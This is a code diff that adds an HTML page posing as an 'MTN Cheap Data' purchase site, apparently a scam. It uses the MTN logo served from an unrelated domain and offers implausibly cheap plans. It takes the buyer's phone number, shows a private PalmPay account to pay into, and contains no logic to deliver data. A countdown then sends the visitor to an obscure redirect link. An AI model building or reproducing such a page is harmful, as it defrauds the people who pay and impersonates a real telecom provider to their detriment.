@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D5CDNUJC77U843EEG35G');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+  
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-770QFCFLLQ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-770QFCFLLQ');
+</script>
+  
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>MTN Data Purchase</title>
+  <style>
+    body{
+      margin:0;
+      font-family: Arial, sans-serif;
+      background:#f5f7fb;
+      color:#111;
+      display:flex;
+      justify-content:center;
+      padding:20px;
+    }
+
+    .container{
+      width:100%;
+      max-width:420px;
+    }
+
+    .card{
+      background:#fff;
+      border-radius:14px;
+      padding:20px;
+      box-shadow:0 6px 20px rgba(0,0,0,0.08);
+      margin-top:15px;
+    }
+
+    h1{
+      font-size:20px;
+      margin:0 0 8px;
+      text-align:center;
+    }
+
+    p{
+      font-size:14px;
+      color:#555;
+      text-align:center;
+      margin:0 0 15px;
+    }
+
+    .btn{
+      width:100%;
+      padding:14px;
+      border:none;
+      border-radius:12px;
+      font-size:16px;
+      font-weight:bold;
+      cursor:pointer;
+      background:#ffcc00;
+      color:#000;
+      transition:0.2s;
+    }
+
+    .btn:hover{
+      opacity:0.9;
+    }
+
+    .btn:disabled{
+      background:#ddd;
+      cursor:not-allowed;
+    }
+
+    .plan{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      padding:14px;
+      border-radius:12px;
+      border:1px solid #e5e7eb;
+      margin-bottom:10px;
+      cursor:pointer;
+      transition:0.2s;
+    }
+
+    .plan:hover{
+      border-color:#ffcc00;
+      background:#fffbe6;
+    }
+
+    .plan input{
+      transform:scale(1.2);
+      margin-right:10px;
+    }
+
+    .plan-label{
+      display:flex;
+      align-items:center;
+      font-size:14px;
+      font-weight:bold;
+      color:#111;
+    }
+
+    .plan-price{
+      font-size:13px;
+      color:#444;
+      font-weight:bold;
+    }
+
+    input[type="tel"]{
+      width:100%;
+      padding:14px;
+      border-radius:12px;
+      border:1px solid #ddd;
+      font-size:16px;
+      outline:none;
+      margin-top:10px;
+    }
+
+    input[type="tel"]:focus{
+      border-color:#ffcc00;
+      box-shadow:0 0 0 3px rgba(255,204,0,0.25);
+    }
+
+    .error{
+      background:#ffe5e5;
+      color:#b00000;
+      padding:10px;
+      border-radius:10px;
+      font-size:13px;
+      margin-bottom:12px;
+      display:none;
+      text-align:center;
+    }
+
+    .account-box{
+      background:#111;
+      color:#fff;
+      padding:18px;
+      border-radius:14px;
+      text-align:center;
+      margin-top:15px;
+    }
+
+    .account-box h2{
+      margin:0;
+      font-size:18px;
+      color:#ffcc00;
+    }
+
+    .account-number{
+      margin:12px 0;
+      font-size:22px;
+      font-weight:900;
+      letter-spacing:2px;
+      background:#fff;
+      color:#000;
+      padding:12px;
+      border-radius:12px;
+      user-select:all;
+      cursor:pointer;
+    }
+
+    .copy-btn{
+      margin-top:10px;
+      background:#ffcc00;
+      border:none;
+      padding:12px;
+      width:100%;
+      font-weight:bold;
+      border-radius:12px;
+      cursor:pointer;
+    }
+
+    .timer{
+      margin-top:15px;
+      text-align:center;
+      font-size:14px;
+      font-weight:bold;
+      color:#333;
+    }
+
+    .timer span{
+      font-size:20px;
+      color:#b00000;
+    }
+
+    .note{
+      margin-top:12px;
+      font-size:13px;
+      text-align:center;
+      color:#555;
+    }
+
+    .small{
+      font-size:12px;
+      color:#777;
+      text-align:center;
+      margin-top:10px;
+    }
+
+    .back-btn{
+      margin-top:10px;
+      background:#eee;
+      color:#000;
+      font-weight:bold;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+<center><img src="https://winxa.online/wp-content/uploads/2025/12/mtn-logo-png.png" class="logo" width="100" alt="MTN Logo"></center>
+
+    <!-- PAGE 1 -->
+    <div class="card" id="page1">
+      <h1>MTN Cheap Data</h1>
+      <p>Fast activation • Reliable service</p>
+      <button class="btn" onclick="goToPage(2)">BUY DATA</button>
+      <div class="small">Select a plan and proceed to payment.</div>
+    </div>
+
+    <!-- PAGE 2 -->
+    <div class="card" id="page2" style="display:none;">
+      <h1>Select Data Plan</h1>
+      <p>Choose your preferred package below</p>
+
+      <div class="error" id="planError">Please select a data plan to continue.</div>
+
+      <label class="plan">
+        <div class="plan-label">
+          <input type="radio" name="plan" value="₦1,000 - 10GB">
+          10GB
+        </div>
+        <div class="plan-price">₦1,000</div>
+      </label>
+
+      <label class="plan">
+        <div class="plan-label">
+          <input type="radio" name="plan" value="₦2,000 - 20GB">
+          20GB
+        </div>
+        <div class="plan-price">₦2,000</div>
+      </label>
+
+      <label class="plan">
+        <div class="plan-label">
+          <input type="radio" name="plan" value="₦3,000 - 30GB">
+          30GB
+        </div>
+        <div class="plan-price">₦3,000</div>
+      </label>
+
+      <label class="plan">
+        <div class="plan-label">
+          <input type="radio" name="plan" value="₦4,000 - 40GB">
+          40GB
+        </div>
+        <div class="plan-price">₦4,000</div>
+      </label>
+
+      <label class="plan">
+        <div class="plan-label">
+          <input type="radio" name="plan" value="₦5,000 - 50GB">
+          50GB
+        </div>
+        <div class="plan-price">₦5,000</div>
+      </label>
+
+      <button class="btn" onclick="validatePlan()">NEXT</button>
+      <button class="btn back-btn" onclick="goToPage(1)">BACK</button>
+    </div>
+
+    <!-- PAGE 3 -->
+    <div class="card" id="page3" style="display:none;">
+      <h1>Enter Phone Number</h1>
+      <p>Input the MTN number to receive data</p>
+
+      <div class="error" id="numberError">Please enter a valid phone number.</div>
+
+      <input type="tel" id="phoneNumber" placeholder="e.g. 08012345678" maxlength="11"/>
+
+      <button class="btn" onclick="validateNumber()">NEXT</button>
+      <button class="btn back-btn" onclick="goToPage(2)">BACK</button>
+
+      <div class="note" id="selectedPlanText"></div>
+    </div>
+
+    <!-- PAGE 4 -->
+    <div class="card" id="page4" style="display:none;">
+      <h1>Payment Details</h1>
+      <p>Make payment to the account below</p>
+
+      <div class="account-box">
+        <h2>PALMPAY</h2>
+        <div class="account-number" id="accountNumber" onclick="copyAccountNumber()">
+          8931019585
+        </div>
+        <div style="font-size:16px; font-weight:900; margin-top:5px;">
+          Emmanuel James
+        </div>
+
+        <button class="copy-btn" onclick="copyAccountNumber()">COPY ACCOUNT NUMBER</button>
+      </div>
+
+      <div class="timer">
+        Redirecting in <span id="countdown">30</span> seconds...
+      </div>
+
+      <div class="note" id="summaryText"></div>
+
+      <div class="small">
+        After payment, you will be redirected automatically.
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    let selectedPlan = "";
+    let countdownInterval;
+
+    function goToPage(page){
+      document.getElementById("page1").style.display = "none";
+      document.getElementById("page2").style.display = "none";
+      document.getElementById("page3").style.display = "none";
+      document.getElementById("page4").style.display = "none";
+
+      document.getElementById("page" + page).style.display = "block";
+
+      if(page !== 4){
+        clearInterval(countdownInterval);
+      }
+    }
+
+    function validatePlan(){
+      const plans = document.querySelectorAll('input[name="plan"]');
+      let chosen = "";
+
+      plans.forEach(plan => {
+        if(plan.checked){
+          chosen = plan.value;
+        }
+      });
+
+      if(chosen === ""){
+        document.getElementById("planError").style.display = "block";
+        return;
+      }
+
+      document.getElementById("planError").style.display = "none";
+      selectedPlan = chosen;
+
+      document.getElementById("selectedPlanText").innerHTML =
+        "<b>Selected Plan:</b> " + selectedPlan;
+
+      goToPage(3);
+    }
+
+    function validateNumber(){
+      const phone = document.getElementById("phoneNumber").value.trim();
+
+      // Nigeria numbers are usually 11 digits
+      if(phone.length < 10 || phone.length > 11 || isNaN(phone)){
+        document.getElementById("numberError").style.display = "block";
+        return;
+      }
+
+      document.getElementById("numberError").style.display = "none";
+
+      goToPage(4);
+
+      document.getElementById("summaryText").innerHTML =
+        "<b>Plan:</b> " + selectedPlan + "<br><b>Phone:</b> " + phone;
+
+      startCountdown();
+    }
+
+    function copyAccountNumber(){
+      const acc = "8931019585";
+      navigator.clipboard.writeText(acc).then(() => {
+        alert("Account number copied: " + acc);
+      }).catch(() => {
+        alert("Copy failed. Please copy manually: " + acc);
+      });
+    }
+
+    function startCountdown(){
+      let timeLeft = 30;
+      document.getElementById("countdown").textContent = timeLeft;
+
+      countdownInterval = setInterval(() => {
+        timeLeft--;
+        document.getElementById("countdown").textContent = timeLeft;
+
+        if(timeLeft <= 0){
+          clearInterval(countdownInterval);
+          window.location.href = "https://bewilderedsacrifice.com/pyp0dh8sb?key=36b0b8d9780759a381ce7ace8b30c359";
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+
+</html>
